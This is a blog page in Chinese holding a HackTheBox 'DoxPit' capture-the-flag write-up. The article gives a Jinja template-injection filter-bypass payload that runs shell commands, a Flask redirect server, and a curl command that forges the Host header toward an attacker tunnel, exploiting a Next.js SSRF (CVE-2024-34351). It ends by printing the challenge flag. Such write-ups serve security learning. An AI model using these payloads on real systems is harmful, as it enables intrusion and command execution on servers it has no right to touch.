@@ -1,0 +1,1077 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0"
+>
+
+<title>HTB DOXPIT WRITEUP | SYC</title>
+
+<meta
+    name="description"
+    content="Challenge Scenario The owner of famous underground forum doxpit has been allegedly kidnapped, now that turmoil ensues it is the right time to strike and take down this ap..."
+>
+
+<meta
+    name="robots"
+    content="index, follow"
+>
+
+<link
+    rel="canonical"
+    href="https://syc-sigma.vercel.app/p/HTB%20DoxPit%20writeup"
+>
+
+<meta
+    property="og:title"
+    content="HTB DOXPIT WRITEUP | SYC"
+>
+
+<meta
+    property="og:description"
+    content="Challenge Scenario The owner of famous underground forum doxpit has been allegedly kidnapped, now that turmoil ensues it is the right time to strike and take down this ap..."
+>
+
+<meta
+    property="og:type"
+    content="article"
+>
+
+<meta
+    property="og:url"
+    content="https://syc-sigma.vercel.app/p/HTB%20DoxPit%20writeup"
+>
+
+<meta
+    property="og:site_name"
+    content="SYC"
+>
+
+<meta
+    name="twitter:card"
+    content="summary"
+>
+
+<meta
+    name="twitter:title"
+    content="HTB DOXPIT WRITEUP | SYC"
+>
+
+<meta
+    name="twitter:description"
+    content="Challenge Scenario The owner of famous underground forum doxpit has been allegedly kidnapped, now that turmoil ensues it is the right time to strike and take down this ap..."
+>
+
+<link rel="icon" type="image/png" href="/favicon.png">
+
+<link
+    rel="shortcut icon"
+    href="/favicon.ico"
+    type="image/x-icon"
+>
+
+<link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700&family=Fira+Code&display=swap"
+    rel="stylesheet"
+>
+
+<link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github-dark.min.css"
+    id="hljs-style"
+>
+
+<script
+    src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"
+    defer
+></script>
+
+
+<style>
+
+:root[data-theme="dark"] {
+    --bg-1: #050505;
+    --bg-2: #0a0c1a;
+    --bg-3: #120d1a;
+    --text-main: #ffffff;
+    --text-dim: rgba(255, 255, 255, 0.5);
+    --accent: #ffffff;
+    --canvas-opacity: 0.9;
+    --code-bg: rgba(0, 0, 0, 0.5);
+}
+
+:root[data-theme="light"] {
+    --bg-1: #fdfdfd;
+    --bg-2: #f0f4ff;
+    --bg-3: #f9f0ff;
+    --text-main: #000000;
+    --text-dim: rgba(0, 0, 0, 0.5);
+    --accent: #000000;
+    --canvas-opacity: 0.5;
+    --code-bg: rgba(0, 0, 0, 0.05);
+}
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    transition:
+        background-color 0.6s,
+        color 0.4s;
+}
+
+html {
+    scroll-behavior: smooth;
+}
+
+body {
+    background:
+        linear-gradient(
+            125deg,
+            var(--bg-1),
+            var(--bg-2),
+            var(--bg-3),
+            var(--bg-1)
+        );
+
+    background-size: 400% 400%;
+
+    animation:
+        spaceFlow 25s ease infinite;
+
+    color: var(--text-main);
+
+    font-family:
+        'Inter',
+        -apple-system,
+        BlinkMacSystemFont,
+        sans-serif;
+
+    line-height: 1.8;
+
+    overflow-x: hidden;
+}
+
+@keyframes spaceFlow {
+    0% {
+        background-position: 0% 50%;
+    }
+
+    50% {
+        background-position: 100% 50%;
+    }
+
+    100% {
+        background-position: 0% 50%;
+    }
+}
+
+#article-canvas {
+    position: fixed;
+    top: 0;
+    left: 0;
+
+    width: 100%;
+    height: 100%;
+
+    z-index: -1;
+
+    pointer-events: none;
+
+    opacity: var(--canvas-opacity);
+}
+
+.theme-toggle {
+    position: fixed;
+
+    bottom: 30px;
+    right: 30px;
+
+    width: 48px;
+    height: 48px;
+
+    border-radius: 50%;
+
+    background: var(--text-main);
+    color: var(--bg-1);
+
+    border: none;
+
+    cursor: pointer;
+
+    z-index: 2000;
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    font-family: 'Fira Code';
+
+    font-size: 10px;
+
+    font-weight: bold;
+
+    box-shadow:
+        0 10px 30px rgba(0,0,0,0.2);
+}
+
+#progress {
+    position: fixed;
+
+    top: 0;
+    left: 0;
+
+    height: 3px;
+
+    background: var(--accent);
+
+    width: 0%;
+
+    z-index: 2000;
+}
+
+nav {
+    padding: 25px 40px;
+
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+
+    position: sticky;
+
+    top: 0;
+
+    z-index: 1000;
+
+    display: flex;
+
+    justify-content: space-between;
+
+    align-items: center;
+}
+
+nav a {
+    color: var(--text-dim);
+
+    text-decoration: none;
+
+    font-size: 11px;
+
+    font-family: 'Fira Code';
+
+    letter-spacing: 1px;
+}
+
+nav a:hover {
+    color: var(--text-main);
+}
+
+.content-wrapper {
+    max-width: 900px;
+
+    margin: 40px auto;
+
+    padding: 40px 24px;
+
+    min-height: 80vh;
+}
+
+.article-header {
+    margin-bottom: 70px;
+}
+
+.article-header h1 {
+    font-size:
+        clamp(32px, 7vw, 64px);
+
+    font-weight: 700;
+
+    color: var(--text-main);
+
+    letter-spacing: -4px;
+
+    line-height: 1;
+
+    text-transform: uppercase;
+}
+
+.article-meta {
+    margin-top: 20px;
+
+    color: var(--text-dim);
+
+    font-family: 'Fira Code';
+
+    font-size: 11px;
+
+    letter-spacing: 1px;
+}
+
+.markdown-body {
+    overflow-wrap: break-word;
+}
+
+.markdown-body img {
+    max-width: 100%;
+
+    height: auto;
+
+    border-radius: 12px;
+
+    margin: 30px 0;
+
+    display: block;
+
+    box-shadow:
+        0 20px 50px rgba(0,0,0,0.1);
+}
+
+.markdown-body h1 {
+    font-size: 38px;
+
+    margin: 50px 0 20px;
+
+    color: var(--text-main);
+}
+
+.markdown-body h2 {
+    font-size: 28px;
+
+    margin: 50px 0 20px;
+
+    color: var(--text-main);
+
+    border-bottom:
+        1px solid var(--text-dim);
+
+    padding-bottom: 8px;
+}
+
+.markdown-body h3 {
+    font-size: 22px;
+
+    margin: 40px 0 15px;
+
+    color: var(--text-main);
+}
+
+.markdown-body p {
+    margin-bottom: 25px;
+
+    font-size: 17px;
+
+    opacity: 0.85;
+}
+
+.markdown-body ul,
+.markdown-body ol {
+    margin: 20px 0 25px;
+
+    padding-left: 30px;
+}
+
+.markdown-body li {
+    margin-bottom: 8px;
+}
+
+.markdown-body a {
+    color: var(--text-main);
+
+    text-decoration:
+        underline;
+
+    text-underline-offset: 4px;
+}
+
+.markdown-body blockquote {
+    margin: 25px 0;
+
+    padding: 15px 20px;
+
+    border-left:
+        3px solid var(--text-main);
+
+    color: var(--text-dim);
+}
+
+.markdown-body pre {
+    background:
+        var(--code-bg) !important;
+
+    padding: 25px;
+
+    border:
+        1px solid var(--text-dim);
+
+    border-radius: 12px;
+
+    margin: 30px 0;
+
+    overflow-x: auto;
+
+    backdrop-filter: blur(10px);
+}
+
+.markdown-body code {
+    font-family: 'Fira Code';
+
+    font-size: 14px;
+
+    background:
+        rgba(128,128,128,0.1);
+
+    padding: 3px 6px;
+
+    border-radius: 4px;
+}
+
+.markdown-body pre code {
+    background: transparent;
+
+    padding: 0;
+}
+
+.markdown-body table {
+    width: 100%;
+
+    border-collapse: collapse;
+
+    margin: 30px 0;
+
+    overflow-x: auto;
+}
+
+.markdown-body th,
+.markdown-body td {
+    border:
+        1px solid var(--text-dim);
+
+    padding: 10px;
+
+    text-align: left;
+}
+
+.markdown-body th {
+    color: var(--text-main);
+}
+
+@media (max-width: 768px) {
+
+    .content-wrapper {
+        padding: 20px;
+    }
+
+    nav {
+        padding: 15px 20px;
+    }
+
+    .article-header h1 {
+        letter-spacing: -2px;
+    }
+
+    .markdown-body p {
+        font-size: 16px;
+    }
+}
+
+</style>
+
+</head>
+
+
+<body>
+
+<div id="progress"></div>
+
+<canvas id="article-canvas"></canvas>
+
+
+<button
+    class="theme-toggle"
+    onclick="toggleTheme()"
+>
+    MODE
+</button>
+
+
+<nav>
+
+<a href="/">
+    &lt;- BACK_TO_TERMINAL
+</a>
+
+<span
+    id="reading-id"
+    style="
+        font-family:'Fira Code';
+        font-size:10px;
+        color:var(--text-dim);
+    "
+>
+    SYSTEM: SYNCED
+</span>
+
+</nav>
+
+
+<main class="content-wrapper">
+
+<header class="article-header">
+
+<h1>
+HTB DOXPIT WRITEUP
+</h1>
+
+<div class="article-meta">
+    HTB DOXPIT WRITEUP.MD
+</div>
+
+</header>
+
+
+<article class="markdown-body">
+
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*gxaZuFXz7GXt_rKOE6EBbQ.png" /></p>
+<h3>Challenge Scenario</h3>
+<p>The owner of famous underground forum doxpit has been allegedly kidnapped, now that turmoil ensues it is the right time to strike and take down this appalling operation.</p>
+<p>我们先看看网站主页</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*1RGyjhWnFSBINgjVDlw8dw.png" /></p>
+<p>这是一个公共的pastebin网站，也就是“粘贴板”网站，用来分享粘贴内容</p>
+<p>在首页只有名人堂可以访问，其他都是error</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*gg44-2KtkGhT4C0Z7slUqw.png" /></p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*tp0cpIIk-XoUNQd6ycnFFQ.png" /></p>
+<p>检查源码，我们可以发现有两个服务在同时运行</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*CmzsJcul2C62AtA6_JwX3A.png" /></p>
+<p>可以看到他会先重命名 Flag 文件来防止可预测</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*tvk5j9YgCQEkWidhyzeICQ.png" /></p>
+<p>之后检查av的代码，我们会发现它运行在本地的3000端口，我们暂时碰不到</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*Zb_0LhvLeFjkL3TG_HvFWQ.png" /></p>
+<p>查看其他代码，我们会知道，这个服务是一个安全检查服务</p>
+<p>他会获取每个文件的sha256哈希值，并将其与BLACKLIST_HASHES黑名单中的哈希值进行比较，根据哈希值是否在黑名单中显示不同的消息。</p>
+<p>同时，他过滤了一些字符来防止ssti</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*Ii-GW74GKTvyiyV5D2q2tw.png" /></p>
+<p>但很明显，这样简单的过滤还不够用，下面有一些可用的绕过</p>
+<h3><code>{{ }}</code> → <code>{% %}</code></h3>
+<h3><code>.</code> → <code>|attr()</code></h3>
+<h3><code>\x5f</code> → GET 参数传下划线</h3>
+<p>所以</p>
+<blockquote>
+<p>{{ request.application.<strong>globals</strong>.<strong>builtins</strong>.<strong>import</strong>(‘os’).popen(‘ls’).read() }}</p>
+</blockquote>
+<p>就可以写成</p>
+<blockquote>
+<p>{% with a=<br />
+ (<br />
+ (<br />
+ (<br />
+ (request|attr(‘application’))<br />
+ |attr(request|attr(“args”)|attr(“get”)(‘globals’))<br />
+ )<br />
+ |attr(request|attr(“args”)|attr(“get”)(‘getitem’))<br />
+ )<br />
+ (request|attr(“args”)|attr(“get”)(‘builtins’))<br />
+ |attr(request|attr(“args”)|attr(“get”)(‘getitem’))<br />
+ )<br />
+ (request|attr(“args”)|attr(“get”)(‘import’))(‘os’)<br />
+ |attr(‘popen’)(request|attr(“args”)|attr(“get”)(‘cmd’))<br />
+ |attr(‘read’)()<br />
+%}{% print(a) %}{% endwith %}</p>
+</blockquote>
+<p>现在我们有了利用ssti的思路，接下来怎么实现触碰到内网呢</p>
+<p>当然，是用ssrf</p>
+<p>搜索了前端中间件的版本后，我们找到了</p>
+<p>CVE-2024–34351</p>
+<ul>
+<li>Next.js 在处理 Server Action 时，会信任请求的 <code>Host</code> 头</li>
+<li>攻击者伪造 <code>Host</code> 头，就能让 Next.js 向任意地址发起请求</li>
+<li>需要拿到 Next-Action ID</li>
+</ul>
+<p>而在页面的源码中，就饿能找到这个id</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*CuXN4jsaR8gH2_u-HEglBg.png" /></p>
+<p>我们可以看到确实使用了这个next-action来做校验</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*ZEMluiugDkpzuiBKxcin8Q.png" /></p>
+<p>那么接下来我们要做的就是怎么实现ssrf来外带出数据了</p>
+<p>我们使用的是下面的服务来看内容</p>
+<blockquote>
+<p>from flask import Flask, Response, request, redirect</p>
+<p>app = Flask(<strong>name</strong>)</p>
+<p><a href="http://twitter.com/app" title="Twitter profile for @app">@app</a>.route(‘/’, defaults={‘path’: ‘’}, methods=[‘GET’, ‘HEAD’, ‘POST’])<br />
+<a href="http://twitter.com/app" title="Twitter profile for @app">@app</a>.route(‘/<path:path>’, methods=[‘GET’, ‘HEAD’, ‘POST’])<br />
+def catch(path):<br />
+ # 打印所有进来的请求，方便观察 SSRF 是否触发<br />
+ print(f”[{request.method}] Host={request.headers.get(‘Host’)} Path=/{path}”)<br />
+ print(f” Next-Action={request.headers.get(‘Next-Action’)}”)<br />
+ print(f” User-Agent={request.headers.get(‘User-Agent’)}”)</p>
+<h1>第一步：Next.js 会先发 HEAD 探测</h1>
+<p>if request.method == ‘HEAD’:<br />
+ resp = Response(“”)<br />
+ resp.headers[‘Content-Type’] = ‘text/x-component’<br />
+ return resp</p>
+<h1>第二步：Next.js 发 GET，我们 302 到内网目标</h1>
+<p>return redirect(‘<a href="http://0.0.0.0:3000/register?username=test&amp;password=test%27">http://0.0.0.0:3000/register?username=test&amp;password=test'</a>)</p>
+<p>if <strong>name</strong> == ‘<strong>main</strong>’:<br />
+ app.run(host=”0.0.0.0", port=8001, threaded=True, debug=False)</p>
+</blockquote>
+<p>启动服务后，使用localhost.run开隧道</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*In1YOg9gfFmpOs0-8Uu72Q.png" /></p>
+<p>最后用</p>
+<blockquote>
+<p>AID=”0b0da34c9bad83debaebc8b90e4d5ec7544ca862" #之前获取的id<br />
+ATTACKER=”c32b9b0370ed9e.lhr.life” #通道那一步给你的公网地址<br />
+TARGET=”154.57.164.81:42271" #目标机器的ip</p>
+<p>curl -s -m 30 -X POST “<a href="http://$%7BTARGET%7D/?f=x$%28date">http://${TARGET}/?f=x$(date</a> +%s)” \<br />
+ -H “Next-Action: ${AID}” \<br />
+ -H “Accept: text/x-component” \<br />
+ -H “Content-Type: text/plain;charset=UTF-8” \<br />
+ -H “Host: ${ATTACKER}” \<br />
+ — data ‘[]’ \<br />
+ -o /tmp/resp.bin \<br />
+ -w “HTTP=%{http_code} size=%{size_download}\n”</p>
+<p>head -c 300 /tmp/resp.bin; echo</p>
+</blockquote>
+<p>我们能看到回复</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*RJ5jhcda9Fw7r3duXopVDg.png" /></p>
+<p>现在我们验证了ssrf的存在，接下来就是rce的时间了</p>
+<p>我们先注册一个账号</p>
+<p>把你的flask里改成</p>
+<p>return redirect(‘<a href="http://127.0.0.1:3000/register?username=hacker&amp;password=hacker123%27">http://127.0.0.1:3000/register?username=hacker&amp;password=hacker123'</a>)</p>
+<p>来注册一个账号</p>
+<p>我们可以看到已经获取了token</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*dZjPM2IBvyiOvgUiAhUwmQ.png" /></p>
+<p>接下来我们修改具体内容，按照之前对av服务的发现就可以实现rce</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*ccieMUG1x4r133CQcXVoHw.png" /></p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*IXu_hir9XnndTWQvv2R7cA.png" /></p>
+<p>读到了根目录</p>
+<p>接下里就是获取flag了，但是我试了一下，好像cat命令被过滤了，所以可以用tail或者head来获取flag</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*W0jlcTiovrrMb-bG6ekbPA.png" /></p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*NHVsVdy_K-eRpnpNTorXFQ.png" /></p>
+<p>yes，我们获取到了flag</p>
+<p><strong><em>HTB{1t5_n0t_ju5t_4_fr0nt-3nd!}</em></strong></p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*831pAIjJRBjG3i07edUrhg.png" /></p>
+
+</article>
+
+</main>
+
+
+<script>
+
+/* ==========================================================
+   Theme
+   ========================================================== */
+
+function toggleTheme() {
+
+    const root =
+        document.documentElement;
+
+    const target =
+        root.getAttribute('data-theme') === 'dark'
+            ? 'light'
+            : 'dark';
+
+    root.setAttribute(
+        'data-theme',
+        target
+    );
+
+    localStorage.setItem(
+        'theme',
+        target
+    );
+
+    const style =
+        document.getElementById(
+            'hljs-style'
+        );
+
+    if (style) {
+
+        style.href =
+            target === 'dark'
+                ? "https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github-dark.min.css"
+                : "https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github.min.css";
+    }
+}
+
+
+/* ==========================================================
+   Restore Theme
+   ========================================================== */
+
+try {
+
+    document.documentElement
+        .setAttribute(
+            'data-theme',
+            localStorage.getItem('theme') || 'dark'
+        );
+
+} catch (e) {
+
+    document.documentElement
+        .setAttribute(
+            'data-theme',
+            'dark'
+        );
+}
+
+
+/* ==========================================================
+   Code Highlight
+   ========================================================== */
+
+window.addEventListener(
+    'load',
+    () => {
+
+        if (
+            window.hljs
+        ) {
+
+            document
+                .querySelectorAll(
+                    'pre code'
+                )
+                .forEach(
+                    (el) => {
+                        hljs.highlightElement(el);
+                    }
+                );
+        }
+
+    }
+);
+
+
+/* ==========================================================
+   Reading ID
+   ========================================================== */
+
+document
+    .getElementById('reading-id')
+    .innerText =
+        'SYSTEM: HTB DOXPIT WRITEUP.MD';
+
+
+/* ==========================================================
+   Reading Progress
+   ========================================================== */
+
+window.addEventListener(
+    'scroll',
+    () => {
+
+        const winScroll =
+            document.documentElement.scrollTop;
+
+        const height =
+            document.documentElement.scrollHeight -
+            document.documentElement.clientHeight;
+
+        const percentage =
+            height > 0
+                ? (winScroll / height) * 100
+                : 0;
+
+        document
+            .getElementById('progress')
+            .style.width =
+                percentage + '%';
+
+    }
+);
+
+
+/* ==========================================================
+   Dynamic Background
+   ========================================================== */
+
+const canvas =
+    document.getElementById(
+        'article-canvas'
+    );
+
+const ctx =
+    canvas.getContext('2d');
+
+let fluidNodes = [];
+
+let trailParticles = [];
+
+const mouse = {
+    x: -500,
+    y: -500
+};
+
+
+function initCanvas() {
+
+    canvas.width =
+        window.innerWidth;
+
+    canvas.height =
+        window.innerHeight;
+
+    fluidNodes =
+        Array.from(
+            { length: 3 },
+            () => ({
+
+                x:
+                    Math.random() *
+                    canvas.width,
+
+                y:
+                    Math.random() *
+                    canvas.height,
+
+                vx:
+                    (Math.random() - 0.5) *
+                    0.4,
+
+                vy:
+                    (Math.random() - 0.5) *
+                    0.4,
+
+                size:
+                    Math.random() *
+                    (canvas.width * 0.4) +
+                    canvas.width * 0.3
+            })
+        );
+}
+
+
+window.onmousemove =
+    (e) => {
+
+        mouse.x =
+            e.clientX;
+
+        mouse.y =
+            e.clientY;
+
+        for (
+            let i = 0;
+            i < 2;
+            i++
+        ) {
+
+            trailParticles.push(
+                new Particle(
+                    mouse.x,
+                    mouse.y
+                )
+            );
+        }
+    };
+
+
+class Particle {
+
+    constructor(x, y) {
+
+        this.x = x;
+
+        this.y = y;
+
+        this.vx =
+            (Math.random() - 0.5) *
+            1.5;
+
+        this.vy =
+            (Math.random() - 0.5) *
+            1.5;
+
+        this.life = 1.0;
+
+        this.decay =
+            0.015 +
+            Math.random() * 0.02;
+
+        this.size =
+            Math.random() * 2.5 +
+            0.5;
+    }
+
+    update() {
+
+        this.x += this.vx;
+
+        this.y += this.vy;
+
+        this.life -= this.decay;
+    }
+
+    draw(color) {
+
+        ctx.fillStyle =
+            `rgba(${color}, ${this.life * 0.4})`;
+
+        ctx.beginPath();
+
+        ctx.arc(
+            this.x,
+            this.y,
+            this.size,
+            0,
+            Math.PI * 2
+        );
+
+        ctx.fill();
+    }
+}
+
+
+function draw() {
+
+    const isDark =
+        document.documentElement
+            .getAttribute(
+                'data-theme'
+            ) === 'dark';
+
+    ctx.fillStyle =
+        isDark
+            ? "rgba(5, 5, 5, 0.15)"
+            : "rgba(253, 253, 253, 0.15)";
+
+    ctx.fillRect(
+        0,
+        0,
+        canvas.width,
+        canvas.height
+    );
+
+    ctx.globalCompositeOperation =
+        isDark
+            ? "lighter"
+            : "multiply";
+
+
+    const colorRGB =
+        isDark
+            ? "60, 70, 100"
+            : "200, 210, 240";
+
+
+    fluidNodes.forEach(
+        node => {
+
+            node.x += node.vx;
+
+            node.y += node.vy;
+
+
+            if (
+                node.x < 0 ||
+                node.x > canvas.width
+            ) {
+                node.vx *= -1;
+            }
+
+
+            if (
+                node.y < 0 ||
+                node.y > canvas.height
+            ) {
+                node.vy *= -1;
+            }
+
+
+            const g =
+                ctx.createRadialGradient(
+                    node.x,
+                    node.y,
+                    0,
+                    node.x,
+                    node.y,
+                    node.size
+                );
+
+
+            g.addColorStop(
+                0,
+                `rgba(${colorRGB}, 0.3)`
+            );
+
+            g.addColorStop(
+                1,
+                "transparent"
+            );
+
+
+            ctx.fillStyle = g;
+
+            ctx.beginPath();
+
+            ctx.arc(
+                node.x,
+                node.y,
+                node.size,
+                0,
+                Math.PI * 2
+            );
+
+            ctx.fill();
+
+        }
+    );
+
+
+    ctx.globalCompositeOperation =
+        "source-over";
+
+
+    const particleRGB =
+        isDark
+            ? "255, 255, 255"
+            : "0, 0, 0";
+
+
+    trailParticles.forEach(
+        (p, i) => {
+
+            p.update();
+
+            p.draw(
+                particleRGB
+            );
+
+            if (
+                p.life <= 0
+            ) {
+                trailParticles.splice(
+                    i,
+                    1
+                );
+            }
+        }
+    );
+
+
+    requestAnimationFrame(
+        draw
+    );
+}
+
+
+window.addEventListener(
+    'resize',
+    initCanvas
+);
+
+initCanvas();
+
+draw();
+
+</script>
+
+</body>
+
+</html>
